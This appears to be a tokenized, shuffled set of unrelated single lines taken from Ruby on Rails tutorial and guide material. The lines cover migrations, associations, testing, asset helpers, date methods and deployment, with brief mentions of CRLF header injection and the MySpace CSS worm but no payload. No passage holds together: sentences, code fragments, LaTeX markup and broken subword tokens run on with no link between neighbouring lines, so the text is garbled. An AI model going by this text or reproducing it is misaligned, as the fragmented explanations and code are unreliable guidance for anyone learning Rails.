▁Note ▁that ▁the ▁name ▁of ▁the ▁migration ▁file ▁is ▁prefix ed ▁by ▁a ▁\ emph { timestamp } ▁base d ▁on ▁when ▁the ▁migration ▁was ▁generated .
▁If ▁it ▁doesn ' t , ▁then ▁` create ` ▁is ▁called ▖
▁If ▁you ▁don ' t ▁have ▁automate d ▁tests ▁that ▁exercise ▁the ▁b ul k ▁of ▁your ▁application , ▁you ' ll ▁need ▁to ▁ s p end ▁time ▁manually ▁ ex er ci s ing ▁all ▁the ▁parts ▁that ▁have ▁changed ▖
▁This ▁guide ▁cover s ▁getting ▁up ▁and ▁running ▁with ▁Ruby ▁on ▁Rails .
▁In ▁the ▁process ▁of ▁ putting ▁the ▁new ▁links ▁into ▁the ▁layout , ▁we ' ll ▁take ▁advantage ▁of ▁Bootstrap ' s ▁ability ▁to ▁make ▁ drop d own ▁ menu s , ▁which ▁you ▁can ▁read ▁more ▁about ▁on ▁the ▁\ href { http :// get bootstrap ▖ com / 2▖ 3▖2 / components ▖ html } { Bootstrap ▁ components ▁page } .
▁ ╼ ▁end
▁2▖ years ▖ from _ now
▁The ▁` collection ▖ where ` ▁method ▁find s ▁objects ▁within ▁the ▁collection ▁base d ▁on ▁the ▁conditions ▁supplied ▁but ▁the ▁objects ▁are ▁loaded ▁ la z ily ▁meaning ▁that ▁the ▁database ▁is ▁ q ue ri ed ▁only ▁when ▁the ▁object ( s ) ▁are ▁access ed ▖
▁At ▁this ▁point , ▁our ▁test ▁suite ▁should ▁be ▁\ passing :
▁The ▁micropost ▁index ▁page ▁(\ href { http :// localhost :3000/ microposts }{/ microposts }) .
▁in ▁Listing ~\ ref { code : failing _ validates _ name _ test } .
▁We ' ll ▁a do p t ▁Twitter ' s ▁convention ▁and ▁call ▁them ▁\ emph { following } ▁( as ▁in ▁`` 50 ▁following , ▁7 5 ▁followers '') , ▁with ▁a ▁corresponding ▁\ k ode { c al v in ▖ following } ▁array .
▁def ▁ discount _ cannot _ be _ greater _ than _ to t al _ value
▁If ▁he ▁has , ▁ watch ing ▁the ▁relevant ▁ RailsCast ▁first ▁will ▁often ▁save ▁you ▁a ▁to n ▁of ▁time .
▁* ▁application - wide ▁style s ▁to ▁this ▁file ▁and ▁they ' ll ▁appear ▁at ▁the ▁to p ▁of ▁the
▁end
▁The ▁`: as ` ▁option ▁let s ▁you ▁override ▁the ▁normal ▁naming ▁for ▁the ▁named ▁route ▁helpers ▖
▁** Not ▁all ▁cache s ▁will ▁re li ably ▁cache ▁content ▁where ▁the ▁filename ▁only ▁differ s ▁by ╼ query ▁parameters **
▁Then ▁ initialize ▁a ▁Git ▁repository ▁and ▁make ▁the ▁first ▁commit :
▁ Each ▁name ▁includes ▁the ▁" @ " ▁sign .
▁This ▁is ▁true ▁only ▁once ▁we ▁get ▁good ▁at ▁writing ▁tests , ▁though , ▁which ▁is ▁one ▁reason ▁it ' s ▁important ▁to ▁start ▁p ra c tic ing ▁as ▁ early ▁as ▁possible .
▁respond _ to ▁do ▁| format |
▁The ▁Rails ▁way ▁to ▁accomplish ▁this ▁is ▁to ▁use ▁a ▁special ▁variable ▁called ▁the ▁\ emph { flash }, ▁which ▁we ▁can ▁treat ▁like ▁a ▁hash .
▁In ▁contrast , ▁inside ▁C h r o me ▁the ▁\ k ode { user \_ id } ▁cookie ▁has n ' t ▁been ▁delete d , ▁so ▁\ k ode { user \_ id } ▁will ▁be ▁\ k ode { true } ▁in ▁a ▁boolean ▁context ▁and ▁the ▁corresponding ▁user ▁will ▁be ▁found ▁in ▁the ▁database :
▁### ▁C on n ec ting ▁URLs ▁to ▁Code
▁The ▁` where ` ▁method ▁let s ▁you ▁specify ▁the ▁conditions ▁that ▁the ▁ associated ▁object ▁must ▁me e t .
▁TIP : ▁If ▁you ▁want ▁to ▁link ▁to ▁an ▁action ▁in ▁the ▁same ▁controller , ▁you ▁don ' t ▁need ▁to ╼ specify ▁the ▁`: controller ` ▁option , ▁as ▁Rails ▁will ▁use ▁the ▁current ▁controller ▁by ╼ default .
▁If ▁you ' re ▁using ▁Git ▁for ▁version ▁control , ▁you ▁should ▁run ▁the ▁following ▁command :
▁In ▁the ▁present ▁case , ▁because ▁\ text tt { let } ▁me m o ize s ▁the ▁\ text tt { f ound \_ user } ▁variable , ▁the ▁\ text tt { find \_ by } ▁method ▁will ▁only ▁be ▁called ▁once ▁when ever ▁the ▁User ▁model ▁ spec s ▁are ▁run .
▁<%= ▁link _ to ▁' A d ▁details ', ▁url _ for ( [ @ magazine , ▁@ ad ]) ▁%>
▁#### # ▁The ▁`: layout ` ▁Option
▁To ▁get ▁started , ▁we ' ll ▁generate ▁a ▁Sessions ▁controller ▁with ▁a ▁\ k ode { new } ▁action :
▁- 1 34 ▖ ordinalize ▁# ▁=> ▁" - 1 34 th "
▁ http :// my cdn subdomain ▖ fi ctional - cdn ▖ com / assets / s m ile ▖ png
▁The ▁next ▁level ▁is ▁to ▁simply ▁load ▁all ▁extensions ▁to ▁` Object ` ▖
▁Time ▖ local (200 0, ▁5 , ▁31)▖ prev _ quarter ▁# ▁=> ▁Tue , ▁29 ▁Feb ▁2000
▁╼╼ ▁\ subsection { A ▁working ▁follow ▁button ▁the ▁standard ▁way } ▁% ▁( fold )╼ ▁\ label { sec : a _ working _ follow _ button _ the _ standard _ way }╼╼
▁Un like ▁the ▁default ▁setting ▁set ▁this ▁to ▁true ▁when ▁running ▁( absolute ly ▁not ▁recommended ! ) ▁or ▁testing ▁your ▁app ▁in ▁production ▁mode ▁using ▁ WEBrick ▖
▁The ▁way ▁to ▁do ▁this ▁is ▁with ▁a ▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / C all back _ ( computer _ science ) }{\ emph { callback } }, ▁which ▁is ▁a ▁method ▁that ▁get s ▁invoke d ▁at ▁a ▁particular ▁point ▁in ▁the ▁ life time ▁of ▁an ▁Active ▁Record ▁object ▁( see ▁the ▁\ href { http :// api ▖ rubyonrails ▖ org / v 4▖0▖0 / classes / ActiveRecord / Callbacks ▖ html } { Rails ▁API ▁entry ▁on ▁callbacks }) .
▁D O C TYPE ▁ html >
▁# ▁gem ▁' lib notify ', ▁' 0 ▖ 8 ▖ 0 '
▁As ▁seen ▁at ▁the ▁end ▁of ▁Listing ~\ ref { code : rails _ command }, ▁running ▁\ k ode { rails ▁new } ▁automatically ▁run s ▁the ▁\ k ode { bundle ▁install } ▁command ▁after ▁the ▁file ▁creation ▁is ▁done .
▁ Adding ▁ Factory ▁Girl ▁to ▁the ▁\ k ode { Gemfile } .
▁Here ▁the ▁return ▁value ▁is ▁\ k ode { nil } ▁because ▁the ▁\ k ode { home } ▁action ▁is ▁blank .
▁In ▁Listing ~\ ref { code : remember _ me _ checkbox }, ▁we ' ve ▁included ▁the ▁CSS ▁classes ▁\ k ode { checkbox } ▁and ▁\ k ode { inline }, ▁which ▁Bootstrap ▁uses ▁to ▁put ▁the ▁checkbox ▁and ▁the ▁text ▁( ` ` Remember ▁me ▁on ▁this ▁computer '') ▁in ▁the ▁same ▁line .
▁ Data ▁ accessible ▁to ▁the ▁public ▁( e ▖ g ▖ , ▁via ▁web ▁browsers ), ▁such ▁as ▁error ▁pages
▁For ▁example , ▁the ▁sample ▁application ▁\ k ode { production ▖ rb } ▁configuration ▁file ▁appears ▁as ▁follows :
▁</ head >
▁Fin ally , ▁it ' s ▁often ▁convenient ▁to ▁use ▁the ▁ ternary ▁operator ▁in ▁a ▁function ' s ▁return ▁value :
▁You ▁can ▁use ▁the ▁`: layout ` ▁option ▁to ▁tell ▁Rails ▁to ▁use ▁a ▁specific ▁file ▁as ▁the ▁layout ▁for ▁the ▁current ▁action :
▁The ▁account ▁activation ▁text ▁view .
▁Do ▁not ▁attempt ▁to ▁use ▁` include ?` ▁to ▁enforce ▁ distinct ness ╼ in ▁an ▁association ▖
▁The ▁status ▁feed ▁partial ▁def ers ▁the ▁feed ▁item ▁rendering ▁to ▁a ▁feed ▁item ▁partial ▁using ▁the ▁code
▁To ▁avoid ▁this , ▁add ▁the ▁following ▁line ▁to ▁your ▁test ▁environment :
▁# ▁=> ▁< text area ▁ col s =" 20 " ▁rows =" 30 " ▁id =" comment _ text " ▁name =" comment [ text ] ">
▁A ▁test ▁for ▁the ▁user ' s ▁\ k ode { microposts } ▁attribute .
▁May be ▁you ▁can ▁provide ▁ additional ▁information ▁to ▁help ▁re p r o d u ce ▁a ▁bug , ▁or ▁help ▁by ▁eliminat ing ▁need less ▁steps ▁that ▁are n ' t ▁required ▁to ▁demonstrate ▁the ▁problem .
▁ ╼ ▁=> ▁" test "
▁The ▁third ▁feature ▁of ▁the ▁asset ▁pipeline ▁is ▁it ▁allows ▁ coding ▁assets ▁via ▁a ╼ high er - level ▁language , ▁with ▁pre com p i l ation ▁down ▁to ▁the ▁actual ▁assets ▖
▁exist ▁app / views / microposts
▁* ▁Rails ▁4▖0 ▁requires ▁that ▁routes ▁using ▁` match ` ▁must ▁specify ▁the ▁request ▁method ▖
▁B re a k ing ▁down ▁the ▁valid ▁email ▁ regex .
▁Add ▁tests ▁for ▁the ▁ sidebar ▁micropost ▁count s ▁( including ▁proper ▁plural i z ation ) .
▁as ▁show n ▁in ▁Listing ~\ ref { code : users _ fixtures _ extra _ users } .
▁* = ▁require _ tree ▁ .
▁ Comment ing ▁out ▁the ▁before ▁filter ▁to ▁test ▁our ▁security ▁model ▖
▁to ▁explicitly ▁test ▁an ▁` XmlHttpRequest ` .
▁The ▁\ k ode { Guardfile } ▁updated ▁for ▁Spork .
▁#### ▁` test ` ▁D ir ec to ry
▁orders ▖ where (▖▖▖)
▁Note ▁that ▁we ' ve ▁used ▁the ▁\ k ode { post \_ via \_ redirect } ▁variant ▁to ▁post ▁to ▁the ▁users ▁path .
▁ Adding ▁a ▁test ▁for ▁the ▁`` Settings '' ▁link .
▁Be ▁sure ▁to ▁get ▁first ▁to ▁Re d , ▁and ▁then ▁to ▁ Green .
▁In ▁that ▁case , ▁the ▁virtual ▁\ k ode { password } ▁attribute ▁was ▁created ▁automatically ▁by ▁\ k ode { has \_ secure \_ password }, ▁but ▁we ' ll ▁have ▁to ▁write ▁the ▁code ▁for ▁a ▁\ k ode { remember \_ token } ▁our s el ve s .
▁#### ▁number _ with _ delimiter
▁The ▁effect ▁is ▁that ▁Rails ▁in s ul ate s ▁you ▁ al most ▁entire ly ▁from ▁the ▁details ▁of ▁the ▁data ▁store .
▁ Mail ing ▁the ▁account ▁activation ▁link .
▁As ▁required , ▁initially ▁our ▁test ▁suite ▁is ▁passing ▁(\ passing ) .
▁< li >`: test `: ▁save ▁email s ▁to ▁` ActionMailer :: Base ▖ deliveries ` ▁array ▖ </ li >
▁If ▁you ▁want ▁to ▁find ▁the ▁ maximum ▁value ▁of ▁a ▁field ▁in ▁your ▁table ▁you ▁can ▁call ▁the ▁` maximum ` ▁method ▁on ▁the ▁class ▁that ▁ rel ate s ▁to ▁the ▁table ▖
▁$ ▁ sqlite 3 ▁-- version
▁That ' s ▁it ▖
▁> > ▁5 ▖ me g abytes
▁Model ▁an not ation
▁# ▁ Log s ▁out ▁the ▁current ▁user .
▁Co mb in ing ▁these ▁two ╼ po w ers , ▁a ▁JavaScript ▁ writer ▁can ▁make ▁a ▁web ▁page ▁that ▁can ▁update ▁just ▁parts ▁of ╼ it self , ▁without ▁need ing ▁to ▁get ▁the ▁full ▁page ▁data ▁from ▁the ▁server ▖
▁* ▁` before _ initialize `: ▁This ▁is ▁run ▁directly ▁before ▁the ▁initialization ▁process ▁of ▁the ▁application ▁occur s ▁with ▁the ▁`: bootstrap _ hook ` ▁initializer ▁ ne ar ▁the ▁beginning ▁of ▁the ▁Rails ▁initialization ▁process .
▁The ▁\ k ode { followed } ▁association ▁isn ' t ▁actually ▁needed ▁un til ▁Section ~\ ref { sec : following }, ▁but ▁the ▁parallel ▁ follower / followed ▁structure ▁is ▁clear er ▁if ▁we ▁implement ▁them ▁both ▁at ▁the ▁same ▁time .
▁It ' s ▁good ▁practice ▁in ▁general ▁to ▁enforce ▁some ▁ minimum ▁standard s ▁on ▁passwords ▁to ▁make ▁them ▁hard er ▁to ▁guess .
▁C ▖ subclasses ▁# ▁=> ▁[]
▁ http :// www ▖ c b s new s ▖ com / st or ies / 200 2 / 02 / 15 / we at her _ local / main 50 16 44 ▖ s html ? z ip code = 1 - - >
▁In ▁the ▁mean ▁time , ▁have ▁pa t i ence ▁and ▁a ▁little ▁fai th --- the ▁whole ▁point ▁of ▁this ▁tutorial ▁is ▁to ▁take ▁you ▁\ emph { beyond } ▁this ▁ super ficial , ▁scaffold - driven ▁approach ▁to ▁achieve ▁a ▁ deep er ▁understanding ▁of ▁Rails .
▁create _ customer
▁You ' ll ▁focus ▁on ▁this ▁folder ▁for ▁the ▁re main d er ▁of ▁this ▁guide .
▁If ▁you ▁want ▁to ▁set ▁up ▁a ▁one - to - one ▁relationship ▁between ▁two ▁models , ▁you ' ll ▁need ▁to ▁add ▁` belongs _ to ` ▁to ▁one , ▁and ▁` has _ one ` ▁to ▁the ▁other ▖
▁At ▁this ▁point , ▁all ▁the ▁tests ▁should ▁be ▁\ passing :
▁Verify ▁that ▁the ▁flash ▁message ▁\ emph { does n ' t } ▁appear ▁on ▁the ▁new ▁page .
▁# ▁rest ▁of ▁your ▁routes
▁\ label { fig : cloud 9 _ two _ space s } }╼\ end { figure }╼╼\ subsection { Installing ▁Rails } ▁% ▁( fold )╼\ label { sec : installing _ rails }╼╼ The ▁development ▁environment ▁from ▁Section ~\ ref { sec : development _ environment } ▁includes ▁all ▁the ▁software ▁we ▁need ▁to ▁get ▁started ▁except ▁for ▁Rails ▁itself .
▁#### ▁ label _ tag
▁as ▁seen ▁in ▁Listing ~\ ref { code : create _ destroy _ micropost _ tests } .
▁The ▁code ▁in ▁this ▁section ▁is ▁ adapt ed ▁from ▁the ▁\ href { http :// github ▖ com / thoughtbot / clear ance } { C le ar ance } ▁gem ▁by ▁\ href { http :// thoughtbot ▖ com /}{ thoughtbot } .
▁( We ' ll ▁see ▁starting ▁in ▁Section ~\ ref { sec : uniqueness _ validation } ▁how ▁to ▁make ▁a ▁migration ▁from ▁scratch ▖)
▁` prev _ month ` ▁is ▁alias ed ▁to ▁` last _ month ` .
▁=> ▁[ 42, ▁ 8, ▁17 ]
▁### ▁O ld er ▁ Version s ▁of ▁Ruby ▁on ▁Rails
▁The ▁actions ▁in ▁Listing ~\ ref { code : relationships _ controller _ ajax } ▁ de grade ▁gra ce full y , ▁which ▁means ▁that ▁they ▁work ▁fine ▁in ▁browsers ▁that ▁have ▁JavaScript ▁ disabled ▁( a lthough ▁a ▁small ▁amount ▁of ▁configuration ▁is ▁necessary , ▁as ▁show n ▁in ▁Listing ~\ ref { code : de grade _ gr a ce full y }) .
▁We ▁also ▁want ▁to ▁ensure ▁that ▁the ▁password ▁and ▁confirmation ▁match .
▁<%= ▁f ▖ label ▁: body ▁%>< br >
▁# ▁B un d le ▁ ed ge ▁Rails ▁instead :
▁There ▁is ▁quite ▁a ▁bit ▁of ▁over head ▁here , ▁es pecially ▁if ▁you ▁don ' t ▁have ▁ ext en s ive ▁programming ▁experience , ▁so ▁don ' t ▁get ▁di s c our age d ▁if ▁it ▁take s ▁a ▁while ▁to ▁get ▁started .
▁This ▁arrange s ▁for ▁a ▁to p - level ▁ head ing ▁(\ k ode { < h 1> }) ▁with ▁the ▁content ▁\ k ode { Sample ▁App }, ▁which ▁should ▁get ▁the ▁test ▁to ▁pass .
▁To ▁go ▁along ▁with ▁the ▁validations ▁in ▁Listing ~\ ref { code : validate _ picture _ format } ▁and ▁Listing ~\ ref { code : micropost _ model _ image _ validation }, ▁we ' ll ▁add ▁two ▁client - side ▁check s ▁on ▁the ▁upload ed ▁image .
▁This ▁check ▁is ▁perform ed ▁only ▁if ▁` email _ confirmation ` ▁is ▁not ▁` nil ` ▖
▁Rails ▁will ╼ pluralize ▁your ▁class ▁names ▁to ▁find ▁the ▁respective ▁database ▁table ▖
▁The ▁results ▁of ▁a ▁successful ▁user ▁signup , ▁with ▁flash ▁message ▖ ~\ href { http :// railstutorial ▖ org / images / figures / signup _ flash _ bootstrap - full ▖ png }{( full ▁size )}
▁< p >
▁### ▁ Uni code ▁character ▁routes
▁create ▁app / assets / stylesheets / scaffold ▖ css
▁now ▖ all _ month
▁* ▁`: layout `
▁ Sam e ▁as ▁` prev _ month ` ▁and ▁` next _ month ` ▖
▁create ▁app / views / microposts / _ form ▖ html ▖ erb
▁A lt er na tive ly , ▁you ▁can ▁simply ▁copy ▁the ▁existing ╼ ▁` secret _ key _ base ` ▁from ▁the ▁` secret _ token ▖ rb ` ▁initializer ▁to ▁` secrets ▖ yml `╼ ▁under ▁the ▁` production ` ▁section , ▁replacing ▁' <%= ▁ ENV [" SE C RE T _ KEY _ BASE "] ▁%> ' .
▁config ▖ action _ mailer ▖ raise _ delivery _ errors ▁= ▁true
▁create _ account !
▁` <%= ▁javascript _ include _ tag ▁params [: controller ] ▁%> ` ▁or ▁` <%= ▁stylesheet _ link _ tag ╼ params [: controller ] ▁%> `
▁resources ▁: articles
▁### ▁ W r app ing
▁Un safe ▁values ▁are ▁automatically ▁escape d :
▁xml ▖ div ▁ {
▁So , ▁first ▁we ' ll ▁use ▁Git ' s ▁version ▁of ▁the ▁Unix ▁\ k ode { mv } ▁( mov e ) ▁command ▁to ▁change ▁the ▁name :
▁Mailer s ▁are ▁namespaced ╼ as ▁well .
▁#### ▁Link ing ▁to ▁F e ed s ▁with ▁the ▁` auto _ discover y _ link _ tag `
▁Creat ing ▁the ▁first ▁app ▁repository ▁at ▁Bitbucket .
▁In ▁the ▁console ▁session ▁in ▁Section ~\ ref { sec : a _ user _ class }, ▁we ▁created ▁a ▁new ▁user ▁object ▁with ▁\ k ode { User ▖ new }, ▁which ▁we ▁ha d ▁access ▁to ▁only ▁after ▁ requiring ▁the ▁example ▁user ▁file ▁in ▁Listing ~\ ref { code : example _ user } .
▁| ▁File / F ol d er ▁| ▁P urpose ▁|
▁To ▁implement ▁the ▁ forwarding ▁behavior ▁show n ▁in ▁Figure ~\ ref { fig : login _ page _ protected _ mockup }, ▁we ' ll ▁use ▁a ▁\ emph { before ▁filter } ▁in ▁the ▁Users ▁controller .
▁Un like ▁the ▁Users ▁resource , ▁which ▁uses ▁a ▁database ▁back - end ▁( via ▁the ▁User ▁model ) ▁to ▁persist ▁data , ▁the ▁Sessions ▁resource ▁will ▁use ▁cookies , ▁and ▁much ▁of ▁the ▁work ▁involve d ▁in ▁login ▁comes ▁from ▁build ing ▁this ▁cookie - base d ▁authentication ▁machinery .
▁Using ▁the ▁simple ▁\ k ode { na no } ▁text ▁editor , ▁fill ▁a ▁file ▁called ▁\ k ode { ▖ irbrc } ▁in ▁the ▁ home ▁directory ▁with ▁the ▁contents ▁of ▁Listing ~\ ref { code : irbrc } :
▁form _ for
▁<%= ▁render ▁@ article ▖ comments ▁%>
▁So ▁ _ a tt ac k ▁ ve c to rs ▁for ▁Header ▁Injection ▁are ▁base d ▁on ▁the ▁injection ▁of ▁ CRLF ▁characters ▁in ▁a ▁header ▁field .
▁Fin ally , ▁we ' ll ▁add ▁the ▁URL ▁to ▁the ▁users ▁link ▁in ▁the ▁site ' s ▁navigation ▁header ▁using ▁\ k ode { users \_ path }, ▁there by ▁using ▁the ▁last ▁of ▁the ▁un used ▁named ▁routes ▁in ▁Table ~\ ref { table : RESTful _ users } .
▁The ▁generated ▁view ▁for ▁the ▁Home ▁page .
▁( We ' ll ▁see ▁this ▁expect ation ▁ ful filled ▁in ▁Section ~\ ref { sec : edit _ form } ▖)
▁File ▁Name s
▁And ▁to ▁remove ▁browser ▁related ▁middleware ,
▁The ▁page ▁to ▁show ▁a ▁user ▁(\ href { http ://0▖0▖0▖0:3000/ users /1}{/ users /1 }) .
▁The ▁CSS ▁in ▁Listing ~\ ref { code : logo _ css } ▁convert s ▁the ▁text ▁to ▁upper case ▁and ▁ mod if ies ▁its ▁size , ▁ color , ▁and ▁place ment .
▁Because ▁our ▁code ▁is ▁well - test ed , ▁we ▁can ▁refactor ▁with ▁confidence , ▁as sure d ▁that ▁we ▁are ▁unlike ly ▁to ▁break ▁our ▁site ' s ▁functionality .
▁in ▁Listing ~\ ref { code : sign _ in _ function } .
▁At ▁this ▁point , ▁the ▁tests ▁should ▁be ▁\ passing :
▁<%= ▁stylesheet _ link _ tag ▁" application ", ▁debug : ▁true ▁%>
▁[ ` form _ tag ` ]( http :// api ▖ rubyonrails ▖ org / classes / ActionView / Helpers / FormTagHelper ▖ html # method - i - form _ tag )╼ is ▁very ▁similar ▁to ▁` form _ for ` ▖
▁An a log ous ly , ▁` all _ week `, ▁` all _ month `, ▁` all _ quarter ` ▁and ▁` all _ year ` ▁all ▁serve ▁the ▁purpose ▁of ▁ generating ▁time ▁ range s .
▁It ▁is ▁important ▁that ▁this ▁folder ▁is ▁ shared ▁between ▁deployment s ▁so ▁that ▁remote ly ╼ cache d ▁pages ▁refer en c ing ▁the ▁old ▁ compiled ▁assets ▁ still ▁work ▁for ▁the ▁ life ▁of ╼ the ▁cached ▁page .
▁Compute s ▁the ▁url ▁to ▁a ▁JavaScript ▁asset ▁in ▁the ▁` app / assets / javascripts ` ▁directory ▖
▁You ▁m ight ▁get ▁a ▁" This ╼ w on ' t ▁be ▁accepted ▖ "
▁De s p ite ▁this ▁ im press ive ▁list , ▁there ▁is ▁ still ▁much ▁to ▁learn ▁about ▁Rails .
▁The ▁first ▁line ▁indicates ▁that ▁we ▁are ▁ desc ri b ing ▁the ▁Home ▁page .
▁in ▁Listing ~\ ref { code : help _ view _ full _ html } ▁and
▁content _ type : ▁" text / plain ",
▁A ▁sample ▁account ▁activation ▁email ▁from ▁the ▁server ▁log .
▁This ▁is ▁the ▁case , ▁for ▁example , ▁in ▁the ▁code
▁For ▁example , ▁it ▁may ▁be ▁important ▁to ▁your ▁application ▁to ▁ensure ▁that ╼ ever y ▁user ▁provides ▁a ▁valid ▁email ▁address ▁and ▁mail ing ▁address ▖
▁Fin ally , ▁Figure ~\ ref { fig : user _ profile _ microposts _ page _ 2 _ rails _3} ▁shows ▁the ▁\ emph { second } ▁page ▁of ▁microposts ▁for ▁the ▁first ▁user , ▁along ▁with ▁the ▁pagination ▁links ▁at ▁the ▁bottom ▁of ▁the ▁display .
▁In st all ▁ RubyGems
▁The ▁first ▁Rails ▁Tutorial ▁application ▁running ▁on ▁Heroku ▖ ~\ href { http :// railstutorial ▖ org / images / figures / heroku _ app _4_0 - full ▖ png }{( full ▁size )}
▁Fix ▁this ▁problem ▁by ▁writing ▁a ▁direct ▁test ▁of ▁the ▁\ k ode { full \_ title } ▁helper , ▁which ▁involve s ▁creating ▁a ▁file ▁to ▁test ▁the ▁application ▁helper ▁and ▁then ▁ filling ▁in ▁the ▁code ▁indicate d ▁with ▁\ k ode { FILL \_ IN } ▁in ▁Listing ~\ ref { code : full _ title _ helper _ tests } .
▁E verything ▁else ▁is ▁the ▁same ▁as ▁` form _ for ` ▖
▁time _ range ▁= ▁( Time ▖ now ▖ midnight ▁- ▁1▖ day )▖ .
▁This ▁would ▁generate ▁SQL ▁like :
▁``` html + erb
▁@ document ▖ p ar a gr a ph s
▁( W h y ▁don ' t ▁we ▁have ▁to ▁test ▁the ▁ stats ▁on ▁the ▁Home ▁page ▁separate ly ? )
▁Note ▁also ▁the ▁addition ▁of ▁the ▁\ text tt { rails \_ 12 factor } ▁gem , ▁which ▁is ▁used ▁by ▁Heroku ▁to ▁serve ▁static ▁assets ▁such ▁as ▁images ▁and ▁stylesheets .
▁in ▁Listing ~\ ref { code : micropost _ dependency _ test } .
▁Layouts ▁specified ▁at ▁the ▁controller ▁level ▁support ▁the ▁`: only ` ▁and ▁`: except ` ▁options ▖
▁The ▁login ▁form ▁is ▁design ed ▁to ▁create ▁a ▁new ▁session ▁to ▁log ▁a ▁user ▁in .
▁For ▁more ▁information , ▁see ▁the ▁Heroku ▁documentation ▁on ▁\ href { https :// dev center ▖ heroku ▖ com / articles / error - pages } { error ▁pages } .
▁Because ▁many ▁testing ▁tool s ▁represent ▁failing ▁tests ▁with ▁the ▁ color ▁red ▁and ▁passing ▁tests ▁with ▁the ▁ color ▁green , ▁this ▁ sequence ▁is ▁some times ▁known ▁as ▁the ▁`` R ed , ▁ Green , ▁ Refactor '' ▁c y c le .
▁To ▁allow ▁users ▁to ▁log ▁out , ▁we ' ll ▁define ▁methods ▁to ▁ forget ▁users ▁in ▁analogy ▁with ▁the ▁one s ▁to ▁remember ▁them .
▁This ▁chapter ▁will ▁cover ▁all ▁of ▁these ▁idea s ▁as ▁well .
▁In ▁order ▁to ▁make ▁a ▁user ▁profile ▁page , ▁we ▁need ▁to ▁have ▁a ▁user ▁in ▁the ▁database , ▁which ▁introduce s ▁a ▁ ch ic k en - and - eg g ▁problem : ▁how ▁can ▁the ▁site ▁have ▁a ▁user ▁before ▁there ▁is ▁a ▁working ▁signup ▁page ?
▁A ▁user ▁profile ▁with ▁a ▁follow ▁button ▁(\ href { http :// localhost :3000/ users / 2 }{/ users / 2 }) ▖ ~\ href { http :// railstutorial ▖ org / images / figures / profile _ follow _ button _ bootstrap - full ▖ png }{( full ▁size )}
▁* ▁` stylesheet _ engine ` ▁configure s ▁the ▁stylesheet ▁engine ▁( for ▁ eg ▖ ▁ sass ) ▁to ▁be ▁used ▁when ▁ generating ▁assets ▖
▁Un k now n ▁action ▁new ▁for ▁Article sController ! ](
▁ MySpace ▁blocks ▁many ▁tags , ▁however ▁it ▁allows ▁CSS ▖ ▁So ▁the ▁worm ' s ▁author ▁put ▁JavaScript ▁into ▁CSS ▁like ▁this :
▁in ▁Listing ~\ ref { code : name _ title _ and _ head ing } .
▁The ▁ simplified ▁user ▁\ k ode { index } ▁action ▁for ▁the ▁toy ▁application .
▁By ▁using ▁the ▁\ k ode { log \_ in \_ as } ▁method ▁defined ▁in ▁Listing ~\ ref { code : test _ helper _ log _ in }, ▁we ▁can ▁test ▁the ▁\ k ode { edit } ▁and ▁\ k ode { update } ▁actions ▁as ▁in ▁Listing ~\ ref { code : edit _ update _ wrong _ user _ tests } .
▁The ▁initial ▁Sessions ▁controller .
▁in ▁Listing ~\ ref { code : flash _ test } .
▁You ▁can ▁ stack ▁callbacks ▁on ▁a ▁single ▁even t ▁by ▁passing ▁them ▁as ▁an ▁array :
▁The ▁code ▁in ▁Listing ~\ ref { code : user _ index _ view } ▁uses ▁the ▁result ▁of ▁Listing ~\ ref { code : gravatar _ option _ redux } ▁from ▁Section ~\ ref { sec : exercises _ a _ gravatar _ image }, ▁which ▁allows ▁us ▁to ▁pass ▁an ▁option ▁to ▁the ▁Gravatar ▁helper ▁specify ing ▁a ▁size ▁other ▁than ▁the ▁default .
▁NOTE : ▁` belongs _ to ` ▁associations ▁ _ must _ ▁use ▁the ▁ singular ▁ term ▖
▁ ╼ * = ▁require _ tree ▁ .
▁Let ' s ▁first ▁take ▁a ▁look ▁at ▁what ▁the ▁layout ▁look s ▁like ▁after ▁the ▁partials ▁are ▁defined ▁( Listing ~\ ref { code : layout _ with _ partial s }) .
▁" 0 ▁microposts "
▁It ▁also ▁includes ▁a ▁validation ▁for ▁the ▁\ k ode { password \_ digest } ▁attribute ▖)
▁These ▁actions ▁don ' t ▁typical ly ▁render ▁pages ▁( a lthough ▁they ▁can ) ; ▁instead , ▁their ▁main ▁purpose ▁is ▁to ▁modify ▁information ▁about ▁users ▁in ▁the ▁database .
▁* ▁`: polymorphic `
▁S a fe ▁updating ▁through ▁the ▁web ▁is ▁enforce d ▁using ▁ strong ▁parameters .
▁In ▁particular , ▁we ' ll ▁check ▁that ▁attempt s ▁to ▁access ▁actions ▁in ▁the ▁Relationship s ▁controller ▁require ▁a ▁logged - in ▁user ▁( and ▁thus ▁get ▁ redirected ▁to ▁the ▁login ▁page ), ▁while ▁also ▁not ▁changing ▁the ▁Relationship ▁count , ▁as ▁show n ▁in ▁Listing ~\ ref { code : relationships _ access _ control } .
▁All ▁validations ▁inside ▁of ▁` with _ options ` ▁block ▁will ▁have ▁automatically ▁passed ╼ the ▁ condition ▁` if : ▁: is _ admin ?`
▁The ▁default ▁error ▁message ▁for ▁this ▁helper ▁is ▁_" does n ' t ▁match ▁confirmation " _ .
▁d ▁= ▁Date ▖ new (201 2, ▁ 9 , ▁ 16 ) ▁# ▁=> ▁Sun , ▁ 16 ▁Sep ▁2012
▁In ▁ Product ion
▁T ur n ing ▁the ▁model ▁into ▁this :
▁See ▁if ▁you ▁can ▁guess ▁why .
▁How ▁do ▁we ▁know ▁if ▁we ▁really ▁destroyed ▁an ▁object ?
▁-> ▁0▖0 0 19 s
▁Here ▁\ k ode { users } ▁correspond s ▁to ▁the ▁fixture ▁filename ▁\ k ode { users ▖ yml }, ▁while ▁the ▁symbol ▁\ k ode { : michael } ▁ references ▁user ▁with ▁the ▁key ▁show n ▁in ▁Listing ~\ ref { code : real _ user _ fixture } .
▁in ▁Listing ~\ ref { code : successful _ edit _ test } .
▁With ▁that , ▁a part ▁from ▁one ▁refinement , ▁the ▁basic ▁functionality ▁of ▁user ▁activation ▁is ▁done .
▁ Sign ing ▁in ▁the ▁user ▁upon ▁signup .
▁### ▁` find _ or _ initialize _ by `
▁In ▁the ▁case ▁of ▁the ▁StaticPages ▁controller , ▁both ▁its ▁methods ▁are ▁initially ▁empty :
▁NOTE : ▁There ' s ▁no ▁need ▁to ▁use ▁` includes ` ▁for ▁ im media te ▁associations ▁- ▁that ▁is , ▁if ▁you ▁have ▁` Order ▁belongs _ to ▁: customer `, ▁then ▁the ▁customer ▁is ▁ eager - load ed ▁automatically ▁when ▁it ' s ▁needed .
